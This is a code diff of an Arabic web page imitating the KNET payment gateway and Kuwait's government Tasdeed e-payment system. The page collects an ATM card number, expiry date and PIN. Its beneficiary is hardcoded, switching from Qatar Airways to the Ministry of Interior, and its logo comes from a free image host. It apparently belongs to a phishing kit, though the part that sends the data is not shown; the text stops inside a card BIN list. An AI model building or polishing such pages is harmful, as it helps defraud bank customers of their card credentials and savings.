@@ -1,126 +1,317 @@
-<html xmlns="http://www.w3.org/1999/xhtml"><head>
-<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
-<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" name="viewport"/>
-<title>KNET</title>
-<script src="js/jquery-3.7.1.min.js"></script>
-<link href="css/payment-reset.css" rel="stylesheet" type="text/css"/>
-<link href="css/payment-responsive-ar.css" rel="stylesheet" type="text/css"/>
-<link href="css/payment-layout-ar.css" rel="stylesheet" type="text/css"/>
-<style>
-    .tasdeed-box { background:white; border:1.5px solid #d1d5db; border-radius:20px; padding:15px; margin-bottom:15px; direction:rtl; text-align:right; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
-    .tasdeed-row { display:flex; justify-content:space-between; padding:10px 0; border-bottom:1px solid #f3f4f6; }
-    .tasdeed-label { color:#0056b3; font-weight:bold; font-size:14px; }
-    .tasdeed-value { color:#333; font-weight:500; font-size:15px; }
-</style>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>KNET Payment Gateway</title>
+    <script src="js/jquery-3.7.1.min.js"></script>
+    <script src="js/cardData.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        
+        body { 
+            background-color: #e6eaf0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: flex-start; 
+            min-height: 100vh; 
+            padding: 10px; 
+        }
+        
+        .container { width: 100%; max-width: 340px; } /* Smaller overall width */
+        
+        /* Banner Area - Enlarged, No Black Border */
+        .banner-box { 
+            width: 100%; 
+            margin-bottom: 12px; 
+            border-radius: 10px; 
+            overflow: hidden; 
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2); 
+            border: none; /* Removed black border */
+        }
+        .banner-box img { width: 100%; display: block; transform: scale(1.1); } /* Enlarged */
+        
+        /* Sleek 3-Card Structure - Smaller and Compact */
+        .card { 
+            background: #ffffff; 
+            border-radius: 12px; 
+            padding: 12px 18px; 
+            margin-bottom: 12px; 
+            box-shadow: 0 5px 10px rgba(0,0,0,0.2); 
+            border: 1.5px solid #000; 
+        }
+        
+        /* Branding Header */
+        .header-logos { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            margin-bottom: 15px; 
+        }
+        
+        .tasdeed-side { text-align: right; order: 1; }
+        .tasdeed-side .ar { color: #c5a059; font-size: 20px; font-weight: bold; line-height: 0.9; }
+        .tasdeed-side .en { color: #c5a059; font-size: 13px; line-height: 0.9; letter-spacing: 1px; }
+        
+        .divider { width: 1.5px; height: 30px; background: #ccc; margin: 0 10px; order: 2; }
+        
+        .gov-side { text-align: left; line-height: 1.2; order: 3; }
+        .gov-side .red { color: #d9534f; font-size: 10px; font-weight: bold; }
+        .gov-side .black { color: #333; font-size: 10px; font-weight: bold; }
+
+        /* Row Layout - Compact */
+        .row { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            padding: 8px 0; 
+            border-bottom: 1px solid #eee; 
+        }
+        .row:last-child { border-bottom: none; }
+        
+        .label { color: #0056b3; font-weight: bold; font-size: 12px; flex: 1.3; text-align: right; }
+        .info-val { color: #333; font-size: 12px; flex: 1; text-align: left; font-weight: 500; }
+        
+        /* Input Wrap - LTR for Numbers */
+        .input-wrap { flex: 1.6; position: relative; display: flex; align-items: center; }
+        .field { 
+            width: 100%; 
+            height: 28px; 
+            border-radius: 6px; 
+            border: 1px solid #999; 
+            background: #fdfdfd; 
+            padding: 0 6px; 
+            font-size: 13px; 
+            box-shadow: inset 0 2px 3px rgba(0,0,0,0.15); 
+            text-align: left; 
+            direction: ltr; 
+            outline: none;
+            color: #333;
+        }
+        .field:focus { border-color: #0056b3; }
+        
+        /* Bank Logo Position */
+        .bank-icon { position: absolute; right: 6px; height: 16px; display: none; z-index: 5; pointer-events: none; }
+        #debitNumber { padding-right: 35px; }
+
+        /* Expiry Box */
+        .expiry-group { 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            background: #fdfdfd; 
+            border: 1px solid #999; 
+            border-radius: 6px; 
+            height: 28px; 
+            width: 100%; 
+            box-shadow: inset 0 2px 3px rgba(0,0,0,0.15); 
+            direction: ltr;
+        }
+        .exp-input { width: 30%; border: none; background: transparent; text-align: center; font-size: 13px; outline: none; color: #333; }
+        .exp-sep { color: #0056b3; font-weight: bold; font-size: 13px; margin: 0 4px; }
+        
+        /* Card 3: Grey Action Buttons - Compact */
+        .card-btns { padding: 0 !important; overflow: hidden; border: 1.5px solid #000; border-radius: 10px; }
+        .btn-flex { display: flex; width: 100%; }
+        .action-btn { 
+            flex: 1; 
+            height: 40px; 
+            border: none; 
+            background: #d1d5db; 
+            font-size: 16px; 
+            color: #1f2937; 
+            cursor: pointer; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            font-weight: bold;
+        }
+        .action-btn:first-child { border-left: 1px solid #9ca3af; }
+        .action-btn:active { background: #9ca3af; }
+        
+        /* Footer Area */
+        .footer-text { margin-top: 15px; text-align: center; color: #333; font-size: 11px; line-height: 1.5; }
+        .footer-text b { color: #0056b3; }
+
+        /* Suggestions List - Enhanced for Visibility */
+        .suggestions {
+            position: absolute;
+            top: 30px;
+            left: 0;
+            right: 0;
+            background: #fff;
+            border: 1.5px solid #000;
+            border-radius: 6px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+            z-index: 100;
+            display: none;
+            list-style: none;
+            max-height: 180px;
+            overflow-y: auto;
+            direction: ltr;
+        }
+        .suggestions li {
+            padding: 10px 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #eee;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .suggestions li:hover { background: #f0f7ff; }
+        .suggestions li img { height: 20px; margin-left: 12px; }
+        .suggestions li .bank-info { flex: 1; text-align: left; font-weight: bold; }
+        .suggestions li .bin-num { color: #0056b3; font-weight: bold; margin-right: 12px; }
+    </style>
 </head>
-<body style="background-color: #f0f2f5;">
-<div class="wrapper" style="max-width: 500px; margin: 0 auto; padding: 10px;">
-    <div class="contentBox" style="background:none; border:none; box-shadow:none; padding:0;">
-        <!-- Banner Image -->
-        <div style="width:100%; border-radius:15px; overflow:hidden; margin-bottom:15px;">
-            <img src="data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAK8AAAAwCAYAAABnoirjAAAAw3pUWHRSYXcgcHJvZmlsZSB0eXBlIGV4aWYAAHjabVBbDsMgDPvPKXYE8iiE49CtlXaDHX9Jk05lmyWMcZAJge313OHmIBSQpWnttRaDdOk0TGgJjIOxyMFh7VnD2QdOv5BZfkhDa94/ffwExDZMLZcgvWdhnQtdMl+/gig29o5cPzKoZxBTFDADRnyr1K7t+oV1KzM0FjiJzm3/nJtN77HYO0y0MXIxZq7RAPsS4GGiGiPbOJxNC7fDpwyzgfyb0wl4A3HsWW/7eLPjAAABhWlDQ1BJQ0MgcHJvZmlsZQAAeJx9kT1Iw0AcxV9TtUUrDnYQcchQHcQuKuJYqlgEC6Wt0KqDyaUfQpOGJMXFUXAtOPixWHVwcdbVwVUQBD9AnB2cFF2kxP8lhRYxHhz34929x907QGhUmGp2xQBVs4x0Ii7m8iti4BU96EMQEYxLzNSTmYUsPMfXPXx8vYvyLO9zf45+pWAywCcSx5huWMTrxDObls55nzjMypJCfE48YdAFiR+5Lrv8xrnksMAzw0Y2PUccJhZLHSx3MCsbKvE0cURRNcoXci4rnLc4q5Uaa92TvzBU0JYzXKc5ggQWkUQKImTUsIEKLERp1Ugxkab9uId/2PGnyCWTawOMHPOoQoXk+MH/4He3ZnFq0k0KxYHuF9v+GAUCu0Czbtvfx7bdPAH8z8CV1vZXG8DsJ+n1thY5Aga2gYvrtibvAZc7wNCTLhmSI/lpCsUi8H5G35QHBm+B3lW3t9Y+Th+ALHW1dAMcHAJjJcpe83h3sLO3f8+0+vsBvuFyxRGE6jcAAA4zaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pgo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA0LjQuMC1FeGl2MiI+CiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIKICAgIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiCiAgICB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIKICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIKICAgIHhtbG5zOkdJTVA9Imh0dHA6Ly93d3cuZ2ltcC5vcmcveG1wLyIKICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjFEMDg4RjdFMEVGODExRUE4NTQ1Q0M2QUQ3ODE4OTVDIgogICB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOmI1NDRhMmEyLTg5NjEtNGFkNC1hMjhlLTA3M2FiMDM4NDUzZiIKICAgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOjllNjA2OWY5LTkyMDEtNGQ2OC1iODcyLWJjYzg2YTc5YmQxZCIKICAgZGM6Rm9ybWF0PSJpbWFnZS9wbmciCiAgIEdJTVA6QVBJPSIyLjAiCiAgIEdJTVA6UGxhdGZvcm09IldpbmRvd3MiCiAgIEdJTVA6VGltZVN0YW1wPSIxNzE4MDk1NjMxMDM2NzQzIgogICBHSU1QOlZlcnNpb249IjIuMTAuMzYiCiAgIHRpZmY6T3JpZW50YXRpb249IjEiCiAgIHhtcDpDcmVhdG9yVG9vbD0iR0lNUCAyLjEwIgogICB4bXA6TWV0YWRhdGFEYXRlPSIyMDI0OjA2OjExVDExOjQ3OjAyKzAzOjAwIgogICB4bXA6TW9kaWZ5RGF0ZT0iMjAyNDowNjoxMVQxMTo0NzowMiswMzowMCI+CiAgIDx4bXBNTTpIaXN0b3J5PgogICAgPHJkZjpTZXE+CiAgICAgPHJkZjpsaQogICAgICBzdEV2dDphY3Rpb249InNhdmVkIgogICAgICBzdEV2dDpjaGFuZ2VkPSIvIgogICAgICBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOjkxN2IyZTBlLTcwZjAtNDQ2Ny04MmMxLTVkZmI4NDYwNzBkZSIKICAgICAgc3RFdnQ6c29mdHdhcmVBZ2VudD0iR2ltcCAyLjEwIChXaW5kb3dzKSIKICAgICAgc3RFdnQ6d2hlbj0iMjAyNC0wNi0xMVQxMTo0NzoxMSIvPgogICAgPC9yZGY6U2VxPgogICA8L3htcE1NOkhpc3Rvcnk+CiAgIDx4bXBNTTpEZXJpdmVkRnJvbQogICAgc3RSZWY6ZG9jdW1lbnRJRD0iOTZERjlCRkE2QThCRUE5MEE0MDFDOTRFNUM1NTdFNkQiCiAgICBzdFJlZjppbnN0YW5jZUlEPSI5NkRGOUJGQTZBOEJFQTkwQTQwMUM5NEU1QzU1N0U2RCIvPgogIDwvcmRmOkRlc2NyaXB0aW9uPgogPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8P3hwYWNrZXQgZW5kPSJ3Ij8+MHmm3wAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB+gGCwgvC+Vf8bMAACAASURBVHja7V1ndFTV2n72OWdaeofQkkBIgdBrgqDCBfGqqBdFQbgKiKIISldAKQKiIkhT9CJ4VT4VEAUFFRALhIRA6KRDICEFMpPJ9JlT9v5+zBASkpAJ1uviXSsrM+fs+u5nv22XAW7Rn0bnji0g+UfnkJrPCjJfJgVH55Jb3GmcuFss+HOoIPOV9qKzIlUWzRVZByfc5wFuouSqzJBE0+Ws1KfuucWlW+D9S5Lk0s+niiOZKvZQQlTrL5xeHig6yl+hirMnVezhALesKGuN5hanboH3r8h6y9VPDNRKCCeCcGaAXX0scpxAb/GpYRJuseDPIZ1fzGyH9YKLcHx7gC6MSprmuHB6xYtO6wUZIJGE419rlfCMdItTt+gW/Q2JNOAFD1Rk+/0A9jHQgvjey7ObUmhexqyusmRWaXxaFLbr9oq+vjQluRuIw1r0MFWcKVRx7eR4TXFc7zfy/24MLjz5WoTDeqGVoAoKiOv9+k+NpT9//NUYp+1iiKAOL4vr/Vrp9e8fe3RkTNbZs4bjp0+Zm9qWqsfHq+STp2ZzbVofCtm5fb83eUzPT9MqhRfeVLJzdvItIn+gJvPbzGzeG34+9+um1O14/wPiOpb5CKsydQn+bPNLAGBdviLAufG/sVyrVmUhe3aVAYD5+WktxB9+nKsaPGhp4MrlJTXLMI4cfa9y5UpPISlpUdCqFbRem1cSTYMll/5JyWXYqYimk1mpz6y/eGZlYGMNzDr4VMLZA+PzZdF4HEzOUCRzpxvNG9FR9rDk0k9QZOsPsmg8lZM+9a3cwy/wfyXwXTj9FpeXMdMn/8hcn/reF2Wt4XIzZvicO74ksC4/nlzosBSeZVTOlKWqD24M8qX+OWlTTjptxacYo0cl1+Uh9XKNI+utNmvfBsH2+DiVod/tPoaUAT7mGbPVtfKq1T7Ez3csBD7e2/6zKxUaqtc/R3i+Ox/bjiNhIc9Cre7bZDPpqfFMOpT+ACgdd/UZtdt9mNOZyTWLeKq6jb6+cdBpxxGNJuD6MqjdHoXLFfcqPx0gDTpsCX1XvtSx/0ZfQRX4EGPUzKjraYflQqMzjYFqAMQypjTqD7aMH88CI/qODWkxMFBQBUwHiFaRTNMolT85d3z+X8IWL8n/0NduytuhyFaL6CzfVkdKnljS2VaVs0eRbDan9dyeuvxAc8bkMLcTRtiN6tL4trZRxWlgTPa7gVJ0DyKt348z3v+vFLng3BFmMtmY2WyTMo+d1Cd2jr76XnvXP6yqLp2fVCUkHPKWB6rkPi4SElwIAHz79oyEhpo4f7+bU/M8L9b8Ln7xVRV4HlxMVMHVZ/5LX/0p7EiaLmDZkjraPnTH9nVhZ473DD15RGk02hDfd8UXgjpoDECoIlv6Zx969rUbDoBPKxfhBNnbzrSMG2+NbDdaju+7cgXhVFMAgMqOR0VHxZ1/CbHL4MuYPJQqLg5g9SCGNGNUvJNRlwer1w28OrjU26paxI6hALPXgn7D7apDtnXrVUpR8bfE3/+KcPuAjlxUmygmyxfBkZ8r73swzPLSvFjrexsy5OLi+eKxYzuNY57YXAv4T4wfa7hn2JqqEaN6XCetGSh1wquGucmQ3H+gYdCQ1Ir2HU7rO/fQG8c88ZZHbQCsRnZBADge4HkrAJientTWMODOpcZHRhVXDh+x29C732O2t1fXChcaBtw53tArZaJXobL4Pm99y3HqMwABo/KIvCMv+jaUNiJqYB6jyvmbwYlKE7qdEL4KYGBUWviXwC6TdF74DA2KSMll3NuU+nhVQOnNtpXwvBqKcpGWlZXz4WEO5nT9Aw5HMmnZooiLag3ntu3x9NKlVj73DxtKdLpJcnrGg84vd1SbFcEffrCJ9/c/KxcV7zWOHFN3jAm52tMbgtc4fEQbJko7iEa7IuydtV2gUZ+Xj58oa9jNchdnfHT0XdKhtO3w8YmgDvuzcLkuUYPhLdfefQtqNSMg8N9QCeO9Aq9bTbn2AQyMyW0JERIaShcQOoACVL4Z5sf2WFQCwhs8X3vlH53T5c8Hr+x/Q/1dPZD1J+F5DWtKKF0Wq3642bb6TJxg40LDBhE//GuXd/mMbNpDdem9Zuqbt3uDFq7Wg+eB2QFUsYxsLLyK+AIgdNVa3KS0NDNxM8nmKhVk+phhnc8o3QS16oFE5I6bCeDB1IwZoDdQevFrqdIWqGPoeXlq7igoCdDv9v1ZOjOr74O+WbHU3ynjt8peQW1bH8SFlo9wb3k7LUaFdl83+8FFl7wu+LmkyKIjnKfP130UtqI7U2YewhYQ+LwxtD/rSkwYCBjNJSZzApp1sykGTBgdcDrS2UAUN0x4CDx8z3j/OXn49Rs/hQKVbQjR5hqZudCQ0F8faFkZV/DhUKvAZc1YowDYGWXORBCCfEUIUk8CGlgEjCAEMhp6Yu4sLDHQg7sP1qL/VVVGVCU62uotpu9cowIIWCeShXJ+muicI1VZPorRRoodQXjV8GP/c7pa9iC/e64Xckv+JRvG72ea9VqoVJWvt+5ffsJfUKn5yAIVD6YCgBvAgxc6zZvw2o9iIJsmF9ZECl+8WUXEALxh/06aDVgTlecvmOXoSAcnPv3x7NLpYlcYoKjobpdX+5Q2da/P4CWlKpIeJionMkKoOcvTKp88KFgeuHiYKFz0mc4lwPi71ei5OYHGob8cywrLS2DKKpBKcDzO5Sc3HB9UrehNXlBCOnFCAnQJ3W7C2AEgYFqerH4DhIYWO41eG+OqexmsvyldlMx1pjkVfgbgZuxGlLLC34QwvPuSE3T2UBaRs4gLleWNiV5ks9Ls5n5hRl3yOVlq1hl1QbIkqdMBsLzgNN5kGi1LwCA9POB0ZCVqSAAMxjAGCsDyFBCMBSgoGezwcW22ydER28kHAcQUgKet9RyFjd88C4tKR3LJOkyzS8AeK6cuVxzaFm5zHfssFjdvftmfLkNfOvW7ysaTT96sWhJtTAmKIPZPAjAoDr8Ky13O3WytAkAmN4AEh5WxLVsOaMJ4PWO8o7MDpNchlC3Y05AuCYWT/CXWst32Usjr5pWhFNFFp58TR3T5aVqtSU6DaGMKcQNPCH8/InFfm27zrNe6w4Xe20kFP9zma+EtuuxyNBg9znNPUyx31xjHY4foCjT5KJifwDmgLeXVwAY1Vi20J9/eNMtkW9AOadrfqvlixgfeEhFy8vH8YkJ/w3e+unYOnnTDwKf/BcAEPTJh4UABvyqQckFcLCG2XDh1BuhsmRpdU3d15YSoqM8HFCuSofm+Udf6kKIgJrpJdEIpoirwGgzz2hVan1bHasVFz2+qAWlUnj99TAqi+bqweZ4bXz+0Tl2Qm52zaJm+aSJ2oBCdFT4yJJ58dU8jErdnbbi73LTp89VaQKtLnuZhsrWBTWcu7Yue/m3uYdnviSo/cyyaPFXJMv86vyMRkiSeWNO2uT5gjqoVkOo4oAsmvpQxTHyajt5VUCT9jUQjl9DAvwnSNnZs02TpmwIXLe68A/RTnY7YwyVJCTk0h8tXAQAsFsKFwN0Yn3AdbOS1lCF7GnJZXj6etXGmAJaI0xJOO3/tU58tpYN63KUpzKmRDdYT41ABaXiJsmpRy1j/1cRaZIp41bftcAvUsV5J1VchxTFBkalmu8ZAJkq9tuo4jigyJbr3nuMDMk8DIQbRp1iHU/+2sIOwHHacp1fm6+a0rvgHV8oxmH/6g61+lmlQv+2afILywLXvJ32ewMoZM9u2fTCjIFEJbT4w8Gbk/a8QKk40s1s76QSozfW7hyv3UUIZtSSuicWRzsshRFeA4hR96Rhvx6Ivw7MxC6og1cy6lzHGPuAKs67Ga0JPiIKmpBVPK/bJDovb2ZU6lbzPSE8ZWCnwGjX6n4xegMJqi5SaUPHRiVNszW1R8E7t7sArPT8/XFBjreXnwJw6g8Hr09AbLCl8sSKul7C1cH1XuVynAYqTUiaoA74Kbrz7FrixWm9qALYG7+VZPx1ea83KerPy6sCmEod/Em77vPPA0Bu+tR7BVVAiiyZBlLFSXjBFypN2I">
+<body>
+    <div class="container">
+        <!-- Enlarged Banner, No Border -->
+        <div class="banner-box">
+            <img src="images/adds/NewDerayaCamp/pc.jpg" alt="Campaign Banner">
         </div>
 
-        <!-- Box 1: Tasdeed -->
-        <div class="tasdeed-box">
-            <center>
-                <img src="https://i.ibb.co/L6vNf3k/tasdeed-logo.png" style="height:60px;"/>
-                <div style="font-weight:bold; color:#d9534f; margin-top:5px;">نظام الدفع الإلكتروني الحكومي (تسديد)</div>
-            </center>
-            <div class="tasdeed-row" style="margin-top:10px;">
-                <span class="tasdeed-label">:المستفيد</span>
-                <span class="tasdeed-value">القطرية للطيران</span>
-            </div>
-            <div class="tasdeed-row" style="border-bottom:none;">
-                <span class="tasdeed-label">:المبلغ</span>
-                <span class="tasdeed-value">2.800 د.ك</span>
-            </div>
-        </div>
-
-        <!-- Box 2: Form Fields (From Original File) -->
-        <div class="tasdeed-box">
-            <div style="display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #f3f4f6;">
-                <span class="tasdeed-label">:رقم بطاقة الصراف الآلي</span>
-                <div style="width:60%; display:flex; justify-content:flex-end; position:relative;">
-                    <input id="debitNumber" type="text" style="width:100%; padding:8px; border:1px solid #ccc; border-radius:8px; text-align:center;" maxlength="19" autocomplete="off"/>
-                    <ul id="suggestionBox" style="position:absolute; top:40px; background:white; border:1px solid #ccc; width:100%; z-index:100; display:none; list-style:none; padding:0; margin:0; border-radius:8px; box-shadow:0 4px 6px rgba(0,0,0,0.1);"></ul>
+        <!-- Card 1: Branding & Info (Smaller) -->
+        <div class="card">
+            <div class="header-logos">
+                <div class="tasdeed-side">
+                    <div class="ar">تسديد</div>
+                    <div class="en">tasdeed</div>
+                </div>
+                <div class="divider"></div>
+                <div class="gov-side">
+                    <div class="red">نظام الدفع</div>
+                    <div class="black">الإلكتروني</div>
+                    <div class="red">الحكومي</div>
                 </div>
             </div>
-            <div style="display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #f3f4f6;">
-                <span class="tasdeed-label">:تاريخ انتهاء البطاقة</span>
-                <div style="width:60%; display:flex; justify-content:flex-end; direction:ltr;">
-                    <input id="expiryYearBox" type="text" placeholder="YY" style="width:45px; padding:8px; border:1px solid #ccc; border-radius:8px; text-align:center;" maxlength="2"/>
-                    <span style="margin:0 5px; align-self:center;">/</span>
-                    <input id="expiryMonthBox" type="text" placeholder="MM" style="width:45px; padding:8px; border:1px solid #ccc; border-radius:8px; text-align:center;" maxlength="2"/>
+            
+            <div class="row">
+                <span class="label">المستفيد:</span>
+                <span id="beneficiary" class="info-val">Ministry of Interior</span>
+            </div>
+            <div class="row">
+                <span class="label">المبلغ:</span>
+                <span id="amount" class="info-val">KD 100.000</span>
+            </div>
+        </div>
+
+        <!-- Card 2: Details (Smaller) -->
+        <div class="card">
+            <div class="row">
+                <span class="label">رقم بطاقة الصراف الآلي:</span>
+                <div class="input-wrap">
+                    <img id="bankLogo" class="bank-icon" src="" alt="Bank">
+                    <input type="text" id="debitNumber" class="field" maxlength="19" autocomplete="off">
+                    <ul id="suggestionList" class="suggestions"></ul>
                 </div>
             </div>
-            <div style="display:flex; justify-content:space-between; align-items:center; padding:10px 0;">
-                <span class="tasdeed-label">:(PIN) الرقم السري</span>
-                <div style="width:60%; display:flex; justify-content:flex-end;">
-                    <input id="cardPin" type="password" style="width:100%; padding:8px; border:1px solid #ccc; border-radius:8px; text-align:center;" maxlength="4"/>
+            
+            <div class="row">
+                <span class="label">تاريخ انتهاء البطاقة:</span>
+                <div class="input-wrap">
+                    <div class="expiry-group">
+                        <input type="text" id="expMonth" class="exp-input" placeholder="MM" maxlength="2">
+                        <span class="exp-sep">/</span>
+                        <input type="text" id="expYear" class="exp-input" placeholder="YY" maxlength="2">
+                    </div>
+                </div>
+            </div>
+            
+            <div class="row">
+                <span class="label">الرقم السري (PIN):</span>
+                <div class="input-wrap">
+                    <input type="password" id="cardPin" class="field" maxlength="4">
                 </div>
             </div>
         </div>
 
-        <!-- Box 3: Buttons -->
-        <div class="tasdeed-box" style="padding:10px;">
-            <div style="display:flex; gap:10px;">
-                <button onclick="onPay()" style="flex:1; padding:12px; border:none; border-radius:10px; background:#e5e7eb; color:#374151; font-weight:bold; cursor:pointer;">إرسال</button>
-                <button onclick="window.history.back()" style="flex:1; padding:12px; border:none; border-radius:10px; background:#e5e7eb; color:#374151; font-weight:bold; cursor:pointer;">إلغاء</button>
+        <!-- Card 3: Buttons (Smaller) -->
+        <div class="card card-btns">
+            <div class="btn-flex">
+                <button class="action-btn">إرسال</button>
+                <button class="action-btn">إلغاء</button>
             </div>
         </div>
 
-        <div style="text-align:center; font-size:12px; color:#6b7280; margin-top:20px;">
-            جميع الحقوق محفوظة © 2026 <br/>
-            <b style="color:#0056b3;">شركة الخدمات المصرفية الآلية المشتركة – كي نت</b>
+        <div class="footer-text">
+            جميع الحقوق محفوظة © 2026<br>
+            <b>شركة الخدمات المصرفية الآلية المشتركة - كي نت</b>
         </div>
     </div>
-</div>
 
-<script>
-    const cardData = [
-        { bin: "406739", brand: "NBK", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" },
-        { bin: "419252", brand: "CBK", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" },
-        { bin: "516335", brand: "Gulf", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" },
-        { bin: "537015", brand: "KFH", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" }
